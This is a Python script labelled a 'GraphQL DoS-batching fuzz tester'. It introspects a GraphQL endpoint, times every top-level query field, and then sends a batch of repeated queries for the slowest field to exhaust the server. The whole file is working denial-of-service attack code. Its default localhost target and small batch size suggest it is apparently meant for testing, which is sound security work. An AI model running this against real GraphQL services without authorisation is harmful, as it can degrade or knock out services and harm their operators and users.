#!/usr/bin/env python3
import argparse
import json
import sys
import time

import requests
from tqdm import tqdm
from colorama import Fore, Style, init

# TODO: change the script to something closer to the strapi batching script (as that one is better because it has more query 
# with subfields and thus less errors because of missing subfield specifications). Furthermore it ourputs the error if there was one

# Initialize colorama
init(autoreset=True)


def load_introspection_query(path: str) -> dict:
    """
    Load the JSON file containing the introspection query payload.
    """
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Error loading introspection query from {path}: {e}")
        sys.exit(1)


def load_schema_file(path: str) -> dict:
    """
    Load a pre-fetched GraphQL introspection schema result (JSON).
    """
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Error loading schema from {path}: {e}")
        sys.exit(1)


def send_query(url: str, payload) -> tuple:
    """
    Send a POST to the GraphQL endpoint.
    Returns (response, elapsed_time), or (None, -1) on exception.
    """
    try:
        start = time.time()  # to measure the time for the response
        resp = requests.post(url, json=payload)
        return resp, time.time() - start
    except Exception as e:
        print(Fore.RED + f"[Exception] {e}")
        return None, -1


def extract_query_fields(schema: dict) -> list:
    """
    Given an introspection query result, pull out all
    top-level fields under the 'Query' type.
    """
    types = schema.get("data", {}).get("__schema", {}).get("types", [])
    for t in types:
        if t.get("name") == "Query" and t.get("fields"):
            return [f["name"] for f in t["fields"]]
    return []


def measure_field_timings(url: str, fields: list) -> list:
    """
    Execute each field as a simple `{ fieldName }` query,
    measure how long each one takes, and return a
    list of (fieldName, elapsed_time).
    """
    timings = []
    for field in tqdm(fields, desc="Measuring fields"):
        payload = {"query": f"query {{ {field} }}"}
        resp, elapsed = send_query(url, payload)
        if resp is None:
            continue
        if resp.ok:
            timings.append((field, elapsed))
        else:
            print(Fore.YELLOW + f"[Warning] {field} -> HTTP {resp.status_code}")
    return sorted(timings, key=lambda x: x[1], reverse=True)


def send_batched_queries(url: str, field: str, batch_size: int) -> None:
    """
    Construct and send a batch of identical queries for the given field.
    """
    batch = [{"query": f"query {{ {field} }}"} for _ in range(batch_size)]
    print(Fore.CYAN + f"\nSending batch of {batch_size} '{field}' queries…")
    resp, elapsed = send_query(url, batch)
    if resp is None:
        print(Fore.RED + "Batch request exception occurred.")
        return
    if resp.ok:
        print(Fore.GREEN + f"[OK] Batch completed in {elapsed:.2f}s")
    else:
        print(Fore.RED + f"[FAIL] HTTP {resp.status_code} in {elapsed:.2f}s")
        print(resp.text)


def main():
    parser = argparse.ArgumentParser(
        description="GraphQL DoS-batching fuzz tester"
    )
    parser.add_argument(
        "--url", "-u",
        default="http://localhost:5013/graphql",
        help="GraphQL endpoint URL"
    )
    parser.add_argument(
        "--introspect", "-i",
        default="introspecQuery.json",
        help="Path to introspection-query JSON file"
    )
    parser.add_argument(
        "--schema", "-s",
        help="Path to a pre-fetched schema JSON file (skip introspection)",
        default=None
    )
    parser.add_argument(
        "--batch", "-b",
        type=int, default=3,
        help="Number of queries to send in the final batch"
    )
    args = parser.parse_args()

    # Load or fetch schema
    if args.schema:
        print("Loading schema from file…")
        schema = load_schema_file(args.schema)
        print(Fore.GREEN + f"Schema loaded from {args.schema}")
    else:
        # 1) Load introspection file & send query
        introspection_payload = load_introspection_query(args.introspect)
        print("Running introspection…")
        resp, elapsed = send_query(args.url, introspection_payload)
        if resp is None or not resp.ok:
            code = resp.status_code if resp else "N/A"
            print(Fore.RED + f"Introspection failed (HTTP {code}). Exiting.")
            sys.exit(1)
        print(Fore.GREEN + f"Introspection OK ({elapsed:.2f}s)")
        schema = resp.json()

    # Extract fields from schema
    fields = extract_query_fields(schema)
    if not fields:
        print(Fore.RED + "No 'Query' fields found. Exiting.")
        sys.exit(1)
    print(Fore.CYAN + f"Found {len(fields)} top-level query fields.")

    # Measure timings of each possible query
    timings = measure_field_timings(args.url, fields)
    if not timings:
        print(Fore.RED + "None of the fields succeeded. Exiting.")
        sys.exit(1)

    slowest_field, slowest_time = timings[0]
    print(
        Fore.GREEN +
        f"\nSlowest field is '{slowest_field}' at {slowest_time:.2f}s"
    )

    # Send batched queries
    send_batched_queries(args.url, slowest_field, args.batch)


if __name__ == "__main__":
    main()
